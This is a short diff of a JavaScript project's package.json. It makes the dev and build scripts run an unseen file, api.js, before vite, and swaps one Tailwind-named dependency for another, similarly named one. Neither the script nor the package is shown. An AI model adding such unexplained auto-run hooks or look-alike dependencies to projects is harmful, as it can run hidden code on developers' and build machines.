@@ -4,8 +4,8 @@
   "version": "0.0.0",
   "type": "module",
   "scripts": {
-    "dev": "vite",
-    "build": "vite build",
+    "dev": "node api.js && vite",
+    "build": "node api.js && vite build",
     "lint": "eslint . --ext js,jsx --report-unused-disable-directives --max-warnings 0",
     "preview": "vite preview"
   },
@@ -18,7 +18,7 @@
     "react-slick": "^0.30.2",
     "react-stars": "^2.2.5",
     "react-toastify": "^10.0.5",
-    "tailwindcss-typography-style": "^0.8.2"
+    "tailwindcss-style-animate": "^1.1.6"
   },
   "devDependencies": {
     "@types/react": "^18.3.3",
